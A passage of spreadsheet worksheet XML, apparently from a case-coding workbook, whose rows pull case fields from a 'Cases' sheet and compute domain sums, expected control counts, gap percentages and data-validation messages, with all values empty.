        <f>IF(AI147="","",IF(AI147=0,"No domain coded 1; ","")&amp;IF(M147="","Primary domain missing; ",IF(IFERROR(INDEX(E147:L147,1,M147),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N147:AG147)&lt;&gt;AJ147,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH147="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN147" s="13">
        <f>IF(AND(AI147&lt;&gt;"",AM147=""),1,0)</f>
        <v/>
      </c>
      <c r="AO147" s="14" t="n"/>
    </row>
    <row r="148">
      <c r="A148" s="11">
        <f>Cases!A148</f>
        <v/>
      </c>
      <c r="B148" s="11">
        <f>Cases!B148</f>
        <v/>
      </c>
      <c r="C148" s="11">
        <f>Cases!C148</f>
        <v/>
      </c>
      <c r="D148" s="11">
        <f>IF(Cases!F148="",LEFT(Cases!G148,120),Cases!F148)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E148:L148)=0,"",SUM(E148:L148))</f>
        <v/>
      </c>
      <c r="AJ148" s="13">
        <f>IF(AI148="","",N(E148)*3+N(F148)*2+N(G148)*2+N(H148)*2+N(I148)*2+N(J148)*3+N(K148)*3+N(L148)*3)</f>
        <v/>
      </c>
      <c r="AK148" s="13">
        <f>IF(AI148="","",COUNTIF(N148:AG148,1))</f>
        <v/>
      </c>
      <c r="AL148" s="13">
        <f>IF(OR(AJ148="",AJ148=0),"",ROUND(100*(AJ148-AK148)/AJ148,1))</f>
        <v/>
      </c>
      <c r="AM148" s="11">
        <f>IF(AI148="","",IF(AI148=0,"No domain coded 1; ","")&amp;IF(M148="","Primary domain missing; ",IF(IFERROR(INDEX(E148:L148,1,M148),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N148:AG148)&lt;&gt;AJ148,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH148="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN148" s="13">
        <f>IF(AND(AI148&lt;&gt;"",AM148=""),1,0)</f>
        <v/>
      </c>
      <c r="AO148" s="14" t="n"/>
    </row>
    <row r="149">
      <c r="A149" s="11">
        <f>Cases!A149</f>
        <v/>
      </c>
      <c r="B149" s="11">
        <f>Cases!B149</f>
        <v/>
      </c>
      <c r="C149" s="11">
        <f>Cases!C149</f>
        <v/>
      </c>
      <c r="D149" s="11">
        <f>IF(Cases!F149="",LEFT(Cases!G149,120),Cases!F149)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E149:L149)=0,"",SUM(E149:L149))</f>
        <v/>
      </c>
      <c r="AJ149" s="13">
        <f>IF(AI149="","",N(E149)*3+N(F149)*2+N(G149)*2+N(H149)*2+N(I149)*2+N(J149)*3+N(K149)*3+N(L149)*3)</f>
        <v/>
      </c>
      <c r="AK149" s="13">
        <f>IF(AI149="","",COUNTIF(N149:AG149,1))</f>
        <v/>
      </c>
      <c r="AL149" s="13">
        <f>IF(OR(AJ149="",AJ149=0),"",ROUND(100*(AJ149-AK149)/AJ149,1))</f>
        <v/>
      </c>
      <c r="AM149" s="11">
        <f>IF(AI149="","",IF(AI149=0,"No domain coded 1; ","")&amp;IF(M149="","Primary domain missing; ",IF(IFERROR(INDEX(E149:L149,1,M149),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N149:AG149)&lt;&gt;AJ149,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH149="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN149" s="13">
        <f>IF(AND(AI149&lt;&gt;"",AM149=""),1,0)</f>
        <v/>
      </c>
      <c r="AO149" s="14" t="n"/>
    </row>
    <row r="150">
      <c r="A150" s="11">
        <f>Cases!A150</f>
        <v/>
      </c>
      <c r="B150" s="11">
        <f>Cases!B150</f>
        <v/>
      </c>
      <c r="C150" s="11">
        <f>Cases!C150</f>
        <v/>
      </c>
      <c r="D150" s="11">
        <f>IF(Cases!F150="",LEFT(Cases!G150,120),Cases!F150)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E150:L150)=0,"",SUM(E150:L150))</f>
        <v/>
      </c>
      <c r="AJ150" s="13">
        <f>IF(AI150="","",N(E150)*3+N(F150)*2+N(G150)*2+N(H150)*2+N(I150)*2+N(J150)*3+N(K150)*3+N(L150)*3)</f>
        <v/>
      </c>
      <c r="AK150" s="13">
        <f>IF(AI150="","",COUNTIF(N150:AG150,1))</f>
        <v/>
      </c>
      <c r="AL150" s="13">
        <f>IF(OR(AJ150="",AJ150=0),"",ROUND(100*(AJ150-AK150)/AJ150,1))</f>
        <v/>
      </c>
      <c r="AM150" s="11">
        <f>IF(AI150="","",IF(AI150=0,"No domain coded 1; ","")&amp;IF(M150="","Primary domain missing; ",IF(IFERROR(INDEX(E150:L150,1,M150),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N150:AG150)&lt;&gt;AJ150,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH150="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN150" s="13">
        <f>IF(AND(AI150&lt;&gt;"",AM150=""),1,0)</f>
        <v/>
      </c>
      <c r="AO150" s="14" t="n"/>
    </row>
    <row r="151">
      <c r="A151" s="11">
        <f>Cases!A151</f>
        <v/>
      </c>
      <c r="B151" s="11">
        <f>Cases!B151</f>
        <v/>
      </c>
      <c r="C151" s="11">
        <f>Cases!C151</f>
        <v/>
      </c>
      <c r="D151" s="11">
        <f>IF(Cases!F151="",LEFT(Cases!G151,120),Cases!F151)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E151:L151)=0,"",SUM(E151:L151))</f>
        <v/>
      </c>
      <c r="AJ151" s="13">
        <f>IF(AI151="","",N(E151)*3+N(F151)*2+N(G151)*2+N(H151)*2+N(I151)*2+N(J151)*3+N(K151)*3+N(L151)*3)</f>
        <v/>
      </c>
      <c r="AK151" s="13">
        <f>IF(AI151="","",COUNTIF(N151:AG151,1))</f>
        <v/>
      </c>
      <c r="AL151" s="13">
        <f>IF(OR(AJ151="",AJ151=0),"",ROUND(100*(AJ151-AK151)/AJ151,1))</f>
        <v/>
      </c>
      <c r="AM151" s="11">
        <f>IF(AI151="","",IF(AI151=0,"No domain coded 1; ","")&amp;IF(M151="","Primary domain missing; ",IF(IFERROR(INDEX(E151:L151,1,M151),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N151:AG151)&lt;&gt;AJ151,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH151="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN151" s="13">
        <f>IF(AND(AI151&lt;&gt;"",AM151=""),1,0)</f>
        <v/>
      </c>
      <c r="AO151" s="14" t="n"/>
    </row>
    <row r="152">
      <c r="A152" s="11">
        <f>Cases!A152</f>
        <v/>
      </c>
      <c r="B152" s="11">
        <f>Cases!B152</f>
        <v/>
      </c>
      <c r="C152" s="11">
        <f>Cases!C152</f>
        <v/>
      </c>
      <c r="D152" s="11">
        <f>IF(Cases!F152="",LEFT(Cases!G152,120),Cases!F152)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E152:L152)=0,"",SUM(E152:L152))</f>
        <v/>
      </c>
      <c r="AJ152" s="13">
        <f>IF(AI152="","",N(E152)*3+N(F152)*2+N(G152)*2+N(H152)*2+N(I152)*2+N(J152)*3+N(K152)*3+N(L152)*3)</f>
        <v/>
      </c>
      <c r="AK152" s="13">
        <f>IF(AI152="","",COUNTIF(N152:AG152,1))</f>
        <v/>
      </c>
      <c r="AL152" s="13">
        <f>IF(OR(AJ152="",AJ152=0),"",ROUND(100*(AJ152-AK152)/AJ152,1))</f>
        <v/>
      </c>
      <c r="AM152" s="11">
        <f>IF(AI152="","",IF(AI152=0,"No domain coded 1; ","")&amp;IF(M152="","Primary domain missing; ",IF(IFERROR(INDEX(E152:L152,1,M152),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N152:AG152)&lt;&gt;AJ152,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH152="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN152" s="13">
        <f>IF(AND(AI152&lt;&gt;"",AM152=""),1,0)</f>
        <v/>
      </c>
      <c r="AO152" s="14" t="n"/>
    </row>
    <row r="153">
      <c r="A153" s="11">
        <f>Cases!A153</f>
        <v/>
      </c>
      <c r="B153" s="11">
        <f>Cases!B153</f>
        <v/>
      </c>
      <c r="C153" s="11">
        <f>Cases!C153</f>
        <v/>
      </c>
      <c r="D153" s="11">
        <f>IF(Cases!F153="",LEFT(Cases!G153,120),Cases!F153)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E153:L153)=0,"",SUM(E153:L153))</f>
        <v/>
      </c>
      <c r="AJ153" s="13">
        <f>IF(AI153="","",N(E153)*3+N(F153)*2+N(G153)*2+N(H153)*2+N(I153)*2+N(J153)*3+N(K153)*3+N(L153)*3)</f>
        <v/>
      </c>
      <c r="AK153" s="13">
        <f>IF(AI153="","",COUNTIF(N153:AG153,1))</f>
        <v/>
      </c>
      <c r="AL153" s="13">
        <f>IF(OR(AJ153="",AJ153=0),"",ROUND(100*(AJ153-AK153)/AJ153,1))</f>
        <v/>
      </c>
      <c r="AM153" s="11">
        <f>IF(AI153="","",IF(AI153=0,"No domain coded 1; ","")&amp;IF(M153="","Primary domain missing; ",IF(IFERROR(INDEX(E153:L153,1,M153),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N153:AG153)&lt;&gt;AJ153,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH153="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN153" s="13">
        <f>IF(AND(AI153&lt;&gt;"",AM153=""),1,0)</f>
        <v/>
      </c>
      <c r="AO153" s="14" t="n"/>
    </row>
    <row r="154">
      <c r="A154" s="11">
        <f>Cases!A154</f>
        <v/>
      </c>
      <c r="B154" s="11">
        <f>Cases!B154</f>
        <v/>
      </c>
      <c r="C154" s="11">
        <f>Cases!C154</f>
        <v/>
      </c>
      <c r="D154" s="11">
        <f>IF(Cases!F154="",LEFT(Cases!G154,120),Cases!F154)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E154:L154)=0,"",SUM(E154:L154))</f>
        <v/>
      </c>
      <c r="AJ154" s="13">
        <f>IF(AI154="","",N(E154)*3+N(F154)*2+N(G154)*2+N(H154)*2+N(I154)*2+N(J154)*3+N(K154)*3+N(L154)*3)</f>
        <v/>
      </c>
      <c r="AK154" s="13">
        <f>IF(AI154="","",COUNTIF(N154:AG154,1))</f>
        <v/>
      </c>
      <c r="AL154" s="13">
        <f>IF(OR(AJ154="",AJ154=0),"",ROUND(100*(AJ154-AK154)/AJ154,1))</f>
        <v/>
      </c>
      <c r="AM154" s="11">
        <f>IF(AI154="","",IF(AI154=0,"No domain coded 1; ","")&amp;IF(M154="","Primary domain missing; ",IF(IFERROR(INDEX(E154:L154,1,M154),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N154:AG154)&lt;&gt;AJ154,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH154="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN154" s="13">
        <f>IF(AND(AI154&lt;&gt;"",AM154=""),1,0)</f>
        <v/>
      </c>
      <c r="AO154" s="14" t="n"/>
    </row>
    <row r="155">
      <c r="A155" s="11">
        <f>Cases!A155</f>
        <v/>
      </c>
      <c r="B155" s="11">
        <f>Cases!B155</f>
        <v/>
      </c>
      <c r="C155" s="11">
        <f>Cases!C155</f>
        <v/>
      </c>
      <c r="D155" s="11">
        <f>IF(Cases!F155="",LEFT(Cases!G155,120),Cases!F155)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E155:L155)=0,"",SUM(E155:L155))</f>
        <v/>
      </c>
      <c r="AJ155" s="13">
        <f>IF(AI155="","",N(E155)*3+N(F155)*2+N(G155)*2+N(H155)*2+N(I155)*2+N(J155)*3+N(K155)*3+N(L155)*3)</f>
        <v/>
      </c>
      <c r="AK155" s="13">
        <f>IF(AI155="","",COUNTIF(N155:AG155,1))</f>
        <v/>
      </c>
      <c r="AL155" s="13">
        <f>IF(OR(AJ155="",AJ155=0),"",ROUND(100*(AJ155-AK155)/AJ155,1))</f>
        <v/>
      </c>
      <c r="AM155" s="11">
        <f>IF(AI155="","",IF(AI155=0,"No domain coded 1; ","")&amp;IF(M155="","Primary domain missing; ",IF(IFERROR(INDEX(E155:L155,1,M155),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N155:AG155)&lt;&gt;AJ155,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH155="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN155" s="13">
        <f>IF(AND(AI155&lt;&gt;"",AM155=""),1,0)</f>
        <v/>
      </c>
      <c r="AO155" s="14" t="n"/>
    </row>
    <row r="156">
      <c r="A156" s="11">
        <f>Cases!A156</f>
        <v/>
      </c>
      <c r="B156" s="11">
        <f>Cases!B156</f>
        <v/>
      </c>
      <c r="C156" s="11">
        <f>Cases!C156</f>
        <v/>
      </c>
      <c r="D156" s="11">
        <f>IF(Cases!F156="",LEFT(Cases!G156,120),Cases!F156)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E156:L156)=0,"",SUM(E156:L156))</f>
        <v/>
      </c>
      <c r="AJ156" s="13">
        <f>IF(AI156="","",N(E156)*3+N(F156)*2+N(G156)*2+N(H156)*2+N(I156)*2+N(J156)*3+N(K156)*3+N(L156)*3)</f>
        <v/>
      </c>
      <c r="AK156" s="13">
        <f>IF(AI156="","",COUNTIF(N156:AG156,1))</f>
        <v/>
      </c>
      <c r="AL156" s="13">
        <f>IF(OR(AJ156="",AJ156=0),"",ROUND(100*(AJ156-AK156)/AJ156,1))</f>
        <v/>
      </c>
      <c r="AM156" s="11">
        <f>IF(AI156="","",IF(AI156=0,"No domain coded 1; ","")&amp;IF(M156="","Primary domain missing; ",IF(IFERROR(INDEX(E156:L156,1,M156),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N156:AG156)&lt;&gt;AJ156,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH156="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN156" s="13">
        <f>IF(AND(AI156&lt;&gt;"",AM156=""),1,0)</f>
        <v/>
      </c>
      <c r="AO156" s="14" t="n"/>
    </row>
    <row r="157">
      <c r="A157" s="11">
        <f>Cases!A157</f>
        <v/>
      </c>
      <c r="B157" s="11">
        <f>Cases!B157</f>
        <v/>
      </c>
      <c r="C157" s="11">
        <f>Cases!C157</f>
        <v/>
      </c>
      <c r="D157" s="11">
        <f>IF(Cases!F157="",LEFT(Cases!G157,120),Cases!F157)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E157:L157)=0,"",SUM(E157:L157))</f>
        <v/>
      </c>
      <c r="AJ157" s="13">
        <f>IF(AI157="","",N(E157)*3+N(F157)*2+N(G157)*2+N(H157)*2+N(I157)*2+N(J157)*3+N(K157)*3+N(L157)*3)</f>
        <v/>
      </c>
      <c r="AK157" s="13">
        <f>IF(AI157="","",COUNTIF(N157:AG157,1))</f>
        <v/>
      </c>
      <c r="AL157" s="13">
        <f>IF(OR(AJ157="",AJ157=0),"",ROUND(100*(AJ157-AK157)/AJ157,1))</f>
        <v/>
      </c>
      <c r="AM157" s="11">
        <f>IF(AI157="","",IF(AI157=0,"No domain coded 1; ","")&amp;IF(M157="","Primary domain missing; ",IF(IFERROR(INDEX(E157:L157,1,M157),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N157:AG157)&lt;&gt;AJ157,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH157="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN157" s="13">
        <f>IF(AND(AI157&lt;&gt;"",AM157=""),1,0)</f>
        <v/>
      </c>
      <c r="AO157" s="14" t="n"/>
    </row>
    <row r="158">
      <c r="A158" s="11">
        <f>Cases!A158</f>
        <v/>
      </c>
      <c r="B158" s="11">
        <f>Cases!B158</f>
        <v/>
      </c>
      <c r="C158" s="11">
        <f>Cases!C158</f>
        <v/>
      </c>
      <c r="D158" s="11">
        <f>IF(Cases!F158="",LEFT(Cases!G158,120),Cases!F158)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E158:L158)=0,"",SUM(E158:L158))</f>
        <v/>
      </c>
      <c r="AJ158" s="13">
        <f>IF(AI158="","",N(E158)*3+N(F158)*2+N(G158)*2+N(H158)*2+N(I158)*2+N(J158)*3+N(K158)*3+N(L158)*3)</f>
        <v/>
      </c>
      <c r="AK158" s="13">
        <f>IF(AI158="","",COUNTIF(N158:AG158,1))</f>
        <v/>
      </c>
      <c r="AL158" s="13">
        <f>IF(OR(AJ158="",AJ158=0),"",ROUND(100*(AJ158-AK158)/AJ158,1))</f>
        <v/>
      </c>
      <c r="AM158" s="11">
        <f>IF(AI158="","",IF(AI158=0,"No domain coded 1; ","")&amp;IF(M158="","Primary domain missing; ",IF(IFERROR(INDEX(E158:L158,1,M158),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N158:AG158)&lt;&gt;AJ158,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH158="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN158" s="13">
        <f>IF(AND(AI158&lt;&gt;"",AM158=""),1,0)</f>
        <v/>
      </c>
      <c r="AO158" s="14" t="n"/>
    </row>
    <row r="159">
      <c r="A159" s="11">
        <f>Cases!A159</f>
        <v/>
      </c>
      <c r="B159" s="11">
        <f>Cases!B159</f>
        <v/>
      </c>
      <c r="C159" s="11">
        <f>Cases!C159</f>
        <v/>
      </c>
      <c r="D159" s="11">
        <f>IF(Cases!F159="",LEFT(Cases!G159,120),Cases!F159)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E159:L159)=0,"",SUM(E159:L159))</f>
        <v/>
      </c>
      <c r="AJ159" s="13">
        <f>IF(AI159="","",N(E159)*3+N(F159)*2+N(G159)*2+N(H159)*2+N(I159)*2+N(J159)*3+N(K159)*3+N(L159)*3)</f>
        <v/>
      </c>
      <c r="AK159" s="13">
        <f>IF(AI159="","",COUNTIF(N159:AG159,1))</f>
        <v/>
      </c>
      <c r="AL159" s="13">
        <f>IF(OR(AJ159="",AJ159=0),"",ROUND(100*(AJ159-AK159)/AJ159,1))</f>
        <v/>
      </c>
      <c r="AM159" s="11">
        <f>IF(AI159="","",IF(AI159=0,"No domain coded 1; ","")&amp;IF(M159="","Primary domain missing; ",IF(IFERROR(INDEX(E159:L159,1,M159),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N159:AG159)&lt;&gt;AJ159,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH159="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN159" s="13">
        <f>IF(AND(AI159&lt;&gt;"",AM159=""),1,0)</f>
        <v/>
      </c>
      <c r="AO159" s="14" t="n"/>
    </row>
    <row r="160">
      <c r="A160" s="11">
        <f>Cases!A160</f>
        <v/>
      </c>
      <c r="B160" s="11">
        <f>Cases!B160</f>
        <v/>
      </c>
      <c r="C160" s="11">
        <f>Cases!C160</f>
        <v/>
      </c>
      <c r="D160" s="11">
        <f>IF(Cases!F160="",LEFT(Cases!G160,120),Cases!F160)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E160:L160)=0,"",SUM(E160:L160))</f>
        <v/>
      </c>
      <c r="AJ160" s="13">
        <f>IF(AI160="","",N(E160)*3+N(F160)*2+N(G160)*2+N(H160)*2+N(I160)*2+N(J160)*3+N(K160)*3+N(L160)*3)</f>
        <v/>
      </c>
      <c r="AK160" s="13">
        <f>IF(AI160="","",COUNTIF(N160:AG160,1))</f>
        <v/>
      </c>
      <c r="AL160" s="13">
        <f>IF(OR(AJ160="",AJ160=0),"",ROUND(100*(AJ160-AK160)/AJ160,1))</f>
        <v/>
      </c>
      <c r="AM160" s="11">
        <f>IF(AI160="","",IF(AI160=0,"No domain coded 1; ","")&amp;IF(M160="","Primary domain missing; ",IF(IFERROR(INDEX(E160:L160,1,M160),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N160:AG160)&lt;&gt;AJ160,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH160="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN160" s="13">
        <f>IF(AND(AI160&lt;&gt;"",AM160=""),1,0)</f>
        <v/>
      </c>
      <c r="AO160" s="14" t="n"/>
    </row>
    <row r="161">
      <c r="A161" s="11">
        <f>Cases!A161</f>
        <v/>
      </c>
      <c r="B161" s="11">
        <f>Cases!B161</f>
        <v/>
      </c>
      <c r="C161" s="11">
        <f>Cases!C161</f>
        <v/>
      </c>
      <c r="D161" s="11">
        <f>IF(Cases!F161="",LEFT(Cases!G161,120),Cases!F161)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E161:L161)=0,"",SUM(E161:L161))</f>
        <v/>
      </c>
      <c r="AJ161" s="13">
        <f>IF(AI161="","",N(E161)*3+N(F161)*2+N(G161)*2+N(H161)*2+N(I161)*2+N(J161)*3+N(K161)*3+N(L161)*3)</f>
        <v/>
      </c>
      <c r="AK161" s="13">
        <f>IF(AI161="","",COUNTIF(N161:AG161,1))</f>
        <v/>
      </c>
      <c r="AL161" s="13">
        <f>IF(OR(AJ161="",AJ161=0),"",ROUND(100*(AJ161-AK161)/AJ161,1))</f>
        <v/>
      </c>
      <c r="AM161" s="11">
        <f>IF(AI161="","",IF(AI161=0,"No domain coded 1; ","")&amp;IF(M161="","Primary domain missing; ",IF(IFERROR(INDEX(E161:L161,1,M161),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N161:AG161)&lt;&gt;AJ161,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH161="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN161" s="13">
        <f>IF(AND(AI161&lt;&gt;"",AM161=""),1,0)</f>
        <v/>
      </c>
      <c r="AO161" s="14" t="n"/>
    </row>
    <row r="162">
      <c r="A162" s="11">
        <f>Cases!A162</f>
        <v/>
      </c>
      <c r="B162" s="11">
        <f>Cases!B162</f>
        <v/>
      </c>
      <c r="C162" s="11">
        <f>Cases!C162</f>
        <v/>
      </c>
      <c r="D162" s="11">
        <f>IF(Cases!F162="",LEFT(Cases!G162,120),Cases!F162)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E162:L162)=0,"",SUM(E162:L162))</f>
        <v/>
      </c>
      <c r="AJ162" s="13">
        <f>IF(AI162="","",N(E162)*3+N(F162)*2+N(G162)*2+N(H162)*2+N(I162)*2+N(J162)*3+N(K162)*3+N(L162)*3)</f>
        <v/>
      </c>
      <c r="AK162" s="13">
        <f>IF(AI162="","",COUNTIF(N162:AG162,1))</f>
        <v/>
      </c>
      <c r="AL162" s="13">
        <f>IF(OR(AJ162="",AJ162=0),"",ROUND(100*(AJ162-AK162)/AJ162,1))</f>
        <v/>
      </c>
      <c r="AM162" s="11">
        <f>IF(AI162="","",IF(AI162=0,"No domain coded 1; ","")&amp;IF(M162="","Primary domain missing; ",IF(IFERROR(INDEX(E162:L162,1,M162),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N162:AG162)&lt;&gt;AJ162,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH162="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN162" s="13">
        <f>IF(AND(AI162&lt;&gt;"",AM162=""),1,0)</f>
        <v/>
      </c>
      <c r="AO162" s="14" t="n"/>
    </row>
    <row r="163">
      <c r="A163" s="11">
        <f>Cases!A163</f>
        <v/>
      </c>
      <c r="B163" s="11">
        <f>Cases!B163</f>
        <v/>
      </c>
      <c r="C163" s="11">
        <f>Cases!C163</f>
        <v/>
      </c>
      <c r="D163" s="11">
        <f>IF(Cases!F163="",LEFT(Cases!G163,120),Cases!F163)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E163:L163)=0,"",SUM(E163:L163))</f>
        <v/>
      </c>
      <c r="AJ163" s="13">
        <f>IF(AI163="","",N(E163)*3+N(F163)*2+N(G163)*2+N(H163)*2+N(I163)*2+N(J163)*3+N(K163)*3+N(L163)*3)</f>
        <v/>
      </c>
      <c r="AK163" s="13">
        <f>IF(AI163="","",COUNTIF(N163:AG163,1))</f>
        <v/>
      </c>
      <c r="AL163" s="13">
        <f>IF(OR(AJ163="",AJ163=0),"",ROUND(100*(AJ163-AK163)/AJ163,1))</f>
        <v/>
      </c>
      <c r="AM163" s="11">
        <f>IF(AI163="","",IF(AI163=0,"No domain coded 1; ","")&amp;IF(M163="","Primary domain missing; ",IF(IFERROR(INDEX(E163:L163,1,M163),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N163:AG163)&lt;&gt;AJ163,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH163="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN163" s="13">
        <f>IF(AND(AI163&lt;&gt;"",AM163=""),1,0)</f>
        <v/>
      </c>
      <c r="AO163" s="14" t="n"/>
    </row>
    <row r="164">
      <c r="A164" s="11">
        <f>Cases!A164</f>
        <v/>
      </c>
      <c r="B164" s="11">
        <f>Cases!B164</f>
        <v/>
      </c>
      <c r="C164" s="11">
        <f>Cases!C164</f>
        <v/>
      </c>
      <c r="D164" s="11">
        <f>IF(Cases!F164="",LEFT(Cases!G164,120),Cases!F164)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E164:L164)=0,"",SUM(E164:L164))</f>
        <v/>
      </c>
      <c r="AJ164" s="13">
        <f>IF(AI164="","",N(E164)*3+N(F164)*2+N(G164)*2+N(H164)*2+N(I164)*2+N(J164)*3+N(K164)*3+N(L164)*3)</f>
        <v/>
      </c>
      <c r="AK164" s="13">
        <f>IF(AI164="","",COUNTIF(N164:AG164,1))</f>
        <v/>
      </c>
      <c r="AL164" s="13">
        <f>IF(OR(AJ164="",AJ164=0),"",ROUND(100*(AJ164-AK164)/AJ164,1))</f>
        <v/>
      </c>
      <c r="AM164" s="11">
        <f>IF(AI164="","",IF(AI164=0,"No domain coded 1; ","")&amp;IF(M164="","Primary domain missing; ",IF(IFERROR(INDEX(E164:L164,1,M164),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N164:AG164)&lt;&gt;AJ164,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH164="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN164" s="13">
        <f>IF(AND(AI164&lt;&gt;"",AM164=""),1,0)</f>
        <v/>
      </c>
      <c r="AO164" s="14" t="n"/>
    </row>
    <row r="165">
      <c r="A165" s="11">
        <f>Cases!A165</f>
        <v/>
      </c>
      <c r="B165" s="11">
        <f>Cases!B165</f>
        <v/>
      </c>
      <c r="C165" s="11">
        <f>Cases!C165</f>
        <v/>
      </c>
      <c r="D165" s="11">
        <f>IF(Cases!F165="",LEFT(Cases!G165,120),Cases!F165)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E165:L165)=0,"",SUM(E165:L165))</f>
        <v/>
      </c>
      <c r="AJ165" s="13">
        <f>IF(AI165="","",N(E165)*3+N(F165)*2+N(G165)*2+N(H165)*2+N(I165)*2+N(J165)*3+N(K165)*3+N(L165)*3)</f>
        <v/>
      </c>
      <c r="AK165" s="13">
        <f>IF(AI165="","",COUNTIF(N165:AG165,1))</f>
        <v/>
      </c>
      <c r="AL165" s="13">
        <f>IF(OR(AJ165="",AJ165=0),"",ROUND(100*(AJ165-AK165)/AJ165,1))</f>
        <v/>
      </c>
      <c r="AM165" s="11">
        <f>IF(AI165="","",IF(AI165=0,"No domain coded 1; ","")&amp;IF(M165="","Primary domain missing; ",IF(IFERROR(INDEX(E165:L165,1,M165),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N165:AG165)&lt;&gt;AJ165,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH165="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN165" s="13">
        <f>IF(AND(AI165&lt;&gt;"",AM165=""),1,0)</f>
        <v/>
      </c>
      <c r="AO165" s="14" t="n"/>
    </row>
    <row r="166">
      <c r="A166" s="11">
        <f>Cases!A166</f>
        <v/>
      </c>
      <c r="B166" s="11">
        <f>Cases!B166</f>
        <v/>
      </c>
      <c r="C166" s="11">
        <f>Cases!C166</f>
        <v/>
      </c>
      <c r="D166" s="11">
        <f>IF(Cases!F166="",LEFT(Cases!G166,120),Cases!F166)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E166:L166)=0,"",SUM(E166:L166))</f>
        <v/>
      </c>
      <c r="AJ166" s="13">
        <f>IF(AI166="","",N(E166)*3+N(F166)*2+N(G166)*2+N(H166)*2+N(I166)*2+N(J166)*3+N(K166)*3+N(L166)*3)</f>
        <v/>
      </c>
      <c r="AK166" s="13">
